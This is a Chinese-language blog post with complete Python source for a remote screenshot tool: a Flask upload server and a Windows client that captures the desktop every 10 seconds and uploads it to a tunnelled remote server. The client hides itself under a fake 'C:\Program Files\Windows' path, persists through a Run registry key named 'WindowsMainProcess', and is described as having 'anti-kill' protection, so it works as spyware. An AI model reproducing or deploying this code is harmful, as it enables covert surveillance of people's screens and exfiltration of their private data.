---
title: 使用 Python 实现远程截图桌面并上传到服务端
published: 2024-08-22
description: ''
image: ''
tags: ['Python', '内网穿透', 'OpenFrp']
category: '网络'
draft: false 
---

很早之前就想写了，前几天给实现了。

整个程序分为两部分，客户端和服务端。

### 服务端

服务端很简单，只需要用 Flask 跑个服务器，然后监听几个 api 就行了。

我具体实现的 api 就仨：upload、ban、unban，功能和他们名字一样。

```python
import os
import time
from flask import Flask, request

app = Flask(__name__)

blacklist = []

@app.route('/upload', methods=['POST'])
def upload_image():
    if 'screenshot' not in request.files:
        return '没有找到文件', 400

    file = request.files['screenshot']
    if file.filename == '':
        return '文件名称为空', 400
    client_name = request.headers.get('Client-Name')
    if client_name in blacklist:
        return 'Banned', 403

    save_path = os.path.join(os.getcwd(), 'screenshots', client_name)
    os.makedirs(save_path, exist_ok=True)

    timestamp = int(time.time())
    filename = f'{client_name}_{timestamp}.png'
    file.save(os.path.join(save_path, filename))

    return 'Uploaded', 200

@app.route('/ban/<username>', methods=['GET'])
def add_to_blacklist(username):
    blacklist.append(username)
    return f'Banned {username}', 200

@app.route('/unban/<username>', methods=['GET'])
def remove_from_blacklist(username):
    if username in blacklist:
        blacklist.remove(username)
        return f'Unbanned {username}', 200
    else:
        return f'{username} is not banned', 404

if __name__ == '__main__':
    app.run()

```

收到的图片会存在同目录下 /screenshot/用户名 文件夹下，并按时间戳保存。

对于为什么要实现 ban 和 unban 这俩 api，纯纯就是因为如果一个人长期后台跑这个我电脑磁盘扛不住。

这俩 api 用法也贼简单，浏览器访问 `/ban/<username>` 或 `/unban/<username>` 就能封禁和解封了。

### 客户端

客户端就比较麻烦了，主要是要有防杀功能。

```python
import pyautogui
import pyscreenshot
import requests
import socket
import time
import os
import tempfile
import win32com.client
import winreg
import shutil
import ctypes

def take_screenshot_and_upload(upload_url):
  image = pyscreenshot.grab()
  fd, temp_file = tempfile.mkstemp(suffix=".png")
  os.close(fd)
  image.save(temp_file)
  client_name = socket.gethostname()
  headers = {
    'Client-Name': client_name
  }
  try:
    with open(temp_file, "rb") as f:
      response = requests.post(upload_url, files={"screenshot": f}, headers=headers)
      for _ in range(5):
        try:
          os.remove(temp_file)
          break
        except PermissionError:
          print(f"无法删除 {temp_file} 文件，正在重试...")
          time.sleep(0.5)
      return response
  except requests.exceptions.ConnectionError as e:
    print(f"连接错误：{e}")
    return None

upload_url = "http://[你的服务器地址]/upload"

def set_auto_start():
  try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'WindowsMainProcess', 0, winreg.REG_SZ, os.path.abspath(__file__))
    winreg.CloseKey(key)
    print(f"已设置为开机自启。")
  except Exception as e:
    print(f"设置开机自启失败：{e}")

def check_admin_rights():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def move_to_program_files():
  try:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    target_path = r'C:\Program Files\Windows'
    os.makedirs(target_path, exist_ok=True)
    for filename in os.listdir(script_dir):
      source_file = os.path.join(script_dir, filename)
      shutil.move(source_file, target_path)
    print(f"脚本和相关文件已移动到 {target_path}")
  except Exception as e:
    print(f"移动脚本和相关文件失败：{e}")

def main():
  if (not check_admin_rights()) and os.path.abspath(__file__) != r'C:\Program Files\Windows':
    print("需要管理员权限才能运行此程序！")
    os.system('pause')
    return
  if os.path.abspath(__file__) != r'C:\Program Files\Windows':
    move_to_program_files()
    set_auto_start()
  while True:
    response = take_screenshot_and_upload(upload_url)
    if response:
      print(f"上传状态码：{response.status_code}")
      print(f"上传响应：{response.text}")
    else:
      print("连接失败，将在 10 秒后重试...")
    time.sleep(10)

if __name__ == "__main__":
  main()

```

#### `take_screenshot_and_upload()`

使用 `pyscreenshot` 截图当前桌面，然后将图片临时保存到本地。

用 `requests` 上传截图，在此期间，如果网络连接速度较慢，会出现临时截图文件被占用无法删除导致程序异常退出。我的方法就是循环删除，直到能删掉（没想到更好的方法 嘻嘻

同时如果服务端没开的话也得抓一下这个异常，不然又退出了。

#### `set_auto_start()`

开机自启，需要管理员权限，故在 main 开头就得检测是否有管理员权限。但当此程序已被移动到 `C:\Program Files\Windows\` 目录下，则意味着已经设置成功，在 main 开头不需要检测权限，否则每次开机自启后都无法成功运行。

### 关于如何远程连接服务端

我采取的方案是内网穿透。用 OpenFrp 穿透一下内网服务器（默认为 127.0.0.1:5000），隧道类型选 TCP，然后会给你一串网址，例如 `example.com:1234`。然后你把客户端中 `[你的服务器地址]` 改为 `example.com:1234` 即可。

当然，如果你有域名，CNAME 类型记录一下 `example.com`，然后服务器地址后头记得加上端口 `1234` 就好了。挺简单的也。



